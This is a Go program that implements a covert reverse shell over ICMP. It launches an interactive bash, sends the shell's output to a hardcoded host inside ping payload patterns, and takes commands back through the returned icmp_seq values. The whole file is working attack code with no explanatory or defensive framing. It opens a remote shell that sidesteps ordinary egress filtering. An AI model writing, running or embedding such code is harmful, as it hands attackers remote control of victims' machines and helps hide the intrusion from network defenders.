package main

import (
	"encoding/hex"
	"fmt"
	"io"
	"os/exec"
	"regexp"
	"strconv"
	"sync"
	"time"
)

var RHOST = "172.17.0.1"
var COMMAND = []string{"/bin/bash", "-i"}

const MSG_HELLO = "\n----- SHELL STARTED -----\n"
const MSG_BYE = "\n----- SHELL TERMINATED -----\n"

var outQueue []byte
var outQueueLock sync.Mutex

var sendDone = true

var icmpSeqRegexp = regexp.MustCompile("icmp_seq=([0-9]+) ttl=")

var subCmd *exec.Cmd
var subCmdStdin io.WriteCloser

func main() {
	go sendloop()

	subCmd = exec.Command(COMMAND[0], COMMAND[1:]...)

	subCmdStdin, _ = subCmd.StdinPipe()

	stderrPipe, _ := subCmd.StderrPipe()
	stdoutPipe, _ := subCmd.StdoutPipe()

	subCmd.Start()

	send([]byte(MSG_HELLO), len(MSG_HELLO))

	go func() {
		buf := make([]byte, 16)
		for {
			len, err := stderrPipe.Read(buf)
			if err != nil {
				return
			}
			send(buf, len)
		}
	}()

	go func() {
		buf := make([]byte, 16)
		for {
			len, err := stdoutPipe.Read(buf)
			if err != nil {
				return
			}
			send(buf, len)
		}
	}()

	subCmd.Wait()

	send([]byte(MSG_BYE), len(MSG_BYE))

	for !sendDone {
		time.Sleep(time.Second * 1)
	}
}

func send(data []byte, len int) {
	sendDone = false
	outQueueLock.Lock()
	outQueue = append(outQueue, data[:len]...)
	outQueueLock.Unlock()
}

func recv(data []byte) {
	subCmdStdin.Write(data)
}

func sendloop() {
	for {
		outQueueLock.Lock()
		var payloadHex string
		var payload []byte

		payloadLen := len(outQueue)
		if payloadLen > 15 {
			payloadLen = 15
		}
		if payloadLen > 0 {
			payload = outQueue[:payloadLen]
			outQueue = outQueue[payloadLen:]
		}
		outQueueLock.Unlock()

		if payloadLen <= 0 {
			payloadHex = "00"
		} else {
			payloadLenHex := fmt.Sprintf("%02x", payloadLen)
			payloadHex = payloadLenHex + hex.EncodeToString(payload)
			for len(payloadHex) < 32 {
				payloadHex += "00"
			}
		}

		cmd := exec.Command("ping", "-W", "1", "-c", "1", "-p", payloadHex, RHOST)
		out, err := cmd.CombinedOutput()
		if err != nil {
			if payloadLen > 0 {
				outQueueLock.Lock()
				outQueue = append(payload, outQueue...)
				outQueueLock.Unlock()
			}
			continue
		}

		if payloadLen <= 0 {
			sendDone = true
		}

		match := icmpSeqRegexp.FindStringSubmatch(string(out))
		if match == nil {
			return
		}

		num, err := strconv.Atoi(match[1])
		if err == nil && num > 1000 {
			recv([]byte{byte(num - 1000)})
		}
	}
}
